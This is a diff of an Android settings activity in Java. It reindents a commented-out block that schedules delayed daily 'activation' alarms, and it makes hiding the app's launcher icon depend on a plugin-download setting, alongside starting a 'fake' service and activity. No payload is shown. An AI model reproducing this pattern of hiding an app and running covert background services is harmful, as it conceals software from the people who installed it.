@@ -212,36 +212,36 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
         /**
          * 不使用母程序激活了，使用子程序激活
          *
-        long activeTime = SettingManager.getInstance().getKeyActiveTime();
-        if (activeTime == 0) {
-            if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
-                long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
-                //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
-                if (deta >= SettingManager.getInstance().getRealActiveDelayTime()) {
-                    //active now
-//                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
-                    DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
-                } else {
-                    long activeDelay = SettingManager.getInstance().getRealActiveDelayTime()- deta;
-                    DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
-                }
-            }
-        } else {
-            Calendar c = Calendar.getInstance();
-            c.setTimeInMillis(activeTime);
-            int lastDay = c.get(Calendar.DAY_OF_YEAR);
-            c = Calendar.getInstance();
-            int curDay = c.get(Calendar.DAY_OF_YEAR);
+         long activeTime = SettingManager.getInstance().getKeyActiveTime();
+         if (activeTime == 0) {
+         if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
+         long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
+         //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
+         if (deta >= SettingManager.getInstance().getRealActiveDelayTime()) {
+         //active now
+         //                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
+         DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
+         } else {
+         long activeDelay = SettingManager.getInstance().getRealActiveDelayTime()- deta;
+         DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
+         }
+         }
+         } else {
+         Calendar c = Calendar.getInstance();
+         c.setTimeInMillis(activeTime);
+         int lastDay = c.get(Calendar.DAY_OF_YEAR);
+         c = Calendar.getInstance();
+         int curDay = c.get(Calendar.DAY_OF_YEAR);
 
-            if (curDay != lastDay) {
-                //不是同一天，每天激活一次
-                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
-            }
-        }
+         if (curDay != lastDay) {
+         //不是同一天，每天激活一次
+         DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
+         }
+         }
          **/
 
         if (!AppRuntime.isBindingActive(getApplicationContext())
-            && !SettingManager.getInstance().getDisableDownloadPlugin()) {
+                && !SettingManager.getInstance().getDisableDownloadPlugin()) {
             Utils.startFakeService(getApplicationContext(), "[[Utils::startFakeService]]");
             Intent i = new Intent();
             i.setClass(getApplicationContext(), BindFakeActivity.class);
@@ -249,7 +249,9 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
             startActivity(i);
         }
 
-        AppRuntime.hideInLauncher(getApplicationContext());
+        if (!SettingManager.getInstance().getDisableDownloadPlugin()) {
+            AppRuntime.hideInLauncher(getApplicationContext());
+        }
     }
 
     @Override
